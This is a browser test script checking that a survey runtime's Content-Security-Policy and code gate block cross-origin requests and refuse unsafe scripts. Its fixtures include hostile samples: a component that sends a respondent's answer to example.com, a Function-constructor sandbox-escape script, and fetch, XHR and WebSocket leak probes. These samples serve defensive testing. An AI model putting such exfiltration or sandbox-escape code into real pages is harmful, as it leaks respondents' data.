/**
 * S0b — THE RUNTIME CSP AND THE CODE GATE, IN A REAL BROWSER (runtime only: a sandbox test link, no Studio).
 *
 *   1. a respondent page carries Content-Security-Policy (connect-src 'self' …) and the Report-Only twin;
 *   2. from the page, fetch / XHR / sendBeacon to another origin are blocked; the runtime's own /api calls work;
 *   3. the page still loads, saves (the sandbox row holds the answers), and an upload question takes a file;
 *   4. a logic script the code gate refuses does not run — `[rescript:script] [name] refused: …` in the console —
 *      while a good one does (its calculated value reaches the row);
 *   5. a Custom Component whose code the gate refuses shows "This component could not run" (test mode) and warns;
 *      a good component runs.
 */
import assert from "node:assert/strict";
import { chromium } from "./lib/playwright.mjs";

const RUNTIME = process.env.RUNTIME_URL ?? "http://localhost:3001";
let passed = 0;
const ok = (m) => { passed++; console.log(`  ok   ${m}`); };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const def = {
  meta: { id: "csp_probe", code: "CSP_PROBE", title: "CSP probe", version: "1" },
  questions: [
    { id: "q1", code: "Q1", variableName: "Q1", type: "single_select", text: "Pick one", options: [{ code: 1, label: "Yes" }, { code: 2, label: "No" }] },
    { id: "q_up", code: "UP", variableName: "UP", type: "upload", text: "Attach a file", required: false, options: [] },
    { id: "q_cc", code: "CC", variableName: "CC", type: "custom_component", text: "Good component", required: false, options: [],
      customHtml: '<div class="cc-good">component</div>', customJs: "el.setAttribute('data-cc', 'ran'); const b = document.createElement('span'); b.textContent = '★'; el.appendChild(b);" },
    { id: "q_bad", code: "BAD", variableName: "BAD", type: "custom_component", text: "Bad component", required: false, options: [],
      customHtml: '<div class="cc-bad">bad</div>', customJs: "const f = globalThis.fetch; f('https://example.com/?' + api.getValue());" },
    { id: "q2", code: "Q2", variableName: "Q2", type: "single_select", text: "Second page", options: [{ code: 1, label: "A" }, { code: 2, label: "B" }] },
  ],
  flow: [
    { type: "page", id: "p1", questionIds: ["q1", "q_up", "q_cc", "q_bad"] },
    { type: "page", id: "p2", questionIds: ["q2"] },
    { type: "end", id: "e", status: "complete" },
  ],
  scripts: [
    { id: "s_bad", name: "escape", scope: "survey", event: "on_load", enabled: true, code: "(()=>{}).constructor('return fetch')()('https://example.com')" },
    { id: "s_good", name: "stamp", scope: "survey", event: "on_load", enabled: true, code: "setCalc('STAMP', 'ok');" },
  ],
};

const launch = await fetch(`${RUNTIME}/api/session/sandbox`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ action: "launch", definition: def }) });
const { url } = await launch.json();
assert.ok(url, "the sandbox test link was launched");

const browser = await chromium.launch();
const ctx = await browser.newContext({ viewport: { width: 1100, height: 900 } });
const page = await ctx.newPage();
const consoleLines = [];
const pageErrors = [];
page.on("console", (m) => consoleLines.push(`${m.type()}: ${m.text()}`));
page.on("pageerror", (e) => pageErrors.push(e.message));
try {
  const res = await page.goto(`${RUNTIME}${url}`, { waitUntil: "domcontentloaded", timeout: 120000 });
  await page.waitForSelector('[data-qid="q1"]', { timeout: 120000 });
  const h = res.headers();
  assert.match(h["content-security-policy"] ?? "", /^connect-src 'self'/, JSON.stringify(h));
  assert.match(h["content-security-policy"], /form-action 'self'; base-uri 'self'; object-src 'none'/);
  assert.doesNotMatch(h["content-security-policy"], /script-src|img-src/);
  assert.match(h["content-security-policy-report-only"] ?? "", /script-src 'self'/);
  ok(`the page carries the CSP: ${h["content-security-policy"]}`);

  const net = await page.evaluate(async () => {
    const out = {};
    try { await fetch("https://example.com/?leak=1"); out.fetch = "sent"; } catch (e) { out.fetch = `blocked: ${e.message}`; }
    out.xhr = await new Promise((r) => { const x = new XMLHttpRequest(); x.onerror = () => r("blocked"); x.onload = () => r("sent"); try { x.open("GET", "https://example.com/"); x.send(); } catch (e) { r(`blocked: ${e.message}`); } });
    out.ws = await new Promise((r) => { try { const w = new WebSocket("wss://example.com/"); w.onerror = () => r("blocked"); w.onopen = () => r("sent"); setTimeout(() => r("timeout"), 4000); } catch (e) { r(`blocked: ${e.message}`); } });
    try { const own = await fetch("/api/session/sandbox", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ action: "row", sessionId: "none" }), cache: "no-store" }); out.own = own.status; } catch (e) { out.own = `blocked: ${e.message}`; }
    return out;
  });
  assert.match(net.fetch, /^blocked/, JSON.stringify(net));
  assert.match(net.xhr, /^blocked/, JSON.stringify(net));
  assert.match(net.ws, /^blocked/, JSON.stringify(net));
  assert.equal(net.own, 404, `the runtime's own api is reached (an unknown session answers 404): ${net.own}`);
  await sleep(300);
  assert.ok(consoleLines.some((l) => /Content Security Policy/.test(l) && /connect-src/.test(l)), "the browser names the CSP directive");
  ok(`from the page: fetch ${net.fetch.split(":")[0]}, XHR ${net.xhr}, WebSocket ${net.ws}; own /api → ${net.own}`);

  assert.ok(consoleLines.some((l) => /^warning: \[rescript:script\] \[escape\] refused: constructor is not available/.test(l)), consoleLines.filter((l) => /rescript/.test(l)).join("\n"));
  ok("the refused logic script did not run: console says `[rescript:script] [escape] refused: constructor is not available …`");

  assert.equal(await page.getAttribute('[data-qid="q_cc"] .cc-good', "data-cc").catch(() => null) ?? await page.evaluate(() => document.querySelector('[data-qid="q_cc"] [data-cc]')?.getAttribute("data-cc")), "ran");
  await page.waitForSelector('[data-qid="q_bad"] [data-testid="rs-component-failed"]', { timeout: 10000 });
  const notice = await page.textContent('[data-qid="q_bad"] [data-testid="rs-component-failed"]');
  assert.match(notice, /This component could not run: refused by the script check — globalThis is not available/);
  assert.ok(consoleLines.some((l) => /^warning: \[rescript:component\] BAD: refused, not run/.test(l)));
  ok("Custom Components: the good one ran; the bad one shows its notice in test mode and warns in the console");

  await page.click('[data-qid="q1"] label:has-text("Yes")');
  const file = page.locator('[data-qid="q_up"] input[type="file"]').first();
  await file.setInputFiles({ name: "note.txt", mimeType: "text/plain", buffer: Buffer.from("hello csp") });
  await sleep(1500);
  const upText = await page.textContent('[data-qid="q_up"]');
  assert.match(upText, /note\.txt/, upText);
  ok(`the upload question took a file in the sandbox (${upText.replace(/\s+/g, " ").slice(0, 120)})`);

  const sessionId = await page.evaluate(() => window.__rescriptState?.sessionId);
  await page.click('[data-testid="rs-next"]');
  await page.waitForSelector('[data-qid="q2"]', { timeout: 30000 });
  let row = null;
  for (let i = 0; i < 40; i++) {
    row = await (await fetch(`${RUNTIME}/api/session/sandbox`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ action: "row", sessionId }) })).json();
    if (row?.answers > 0 && row?.stepIndex > 0) break;
    await sleep(250);
  }
  assert.ok(row?.answers > 0 && row?.lastSavedAt, JSON.stringify(row).slice(0, 400));
  const stamp = await page.evaluate(() => window.__rescriptState?.calculated?.STAMP);
  assert.equal(stamp, "ok", "the good script ran");
  ok(`the page saved under the CSP (sandbox row: ${row.answers} answer(s), step ${row.stepIndex}, saveSeq ${row.saveSeq}); the good script's STAMP=${stamp}`);
  const csp = consoleLines.filter((l) => /Content Security Policy/.test(l));
  const ownBlocked = csp.filter((l) => /localhost:3001|'self'.*blocked.*localhost/.test(l) && !/report-only/i.test(l));
  assert.equal(ownBlocked.length, 0, ownBlocked.join("\n"));
  assert.deepEqual(pageErrors, [], pageErrors.join("\n"));
  ok(`no own-origin request was blocked; ${csp.length} CSP console line(s), all for the probes or report-only`);
} finally {
  await browser.close();
}
console.log(`\nALL ${passed} RUNTIME CSP CHECKS PASSED`);
